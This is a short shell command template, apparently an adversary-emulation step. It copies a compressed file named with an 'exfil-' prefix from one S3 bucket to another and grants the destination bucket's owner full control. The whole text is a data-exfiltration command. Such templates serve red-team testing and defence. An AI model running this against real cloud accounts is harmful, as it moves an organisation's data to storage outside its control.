LocalFile='#{host.dir.compress}';
RemoteName="exfil-#{paw}-$(basename $LocalFile)";
aws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;
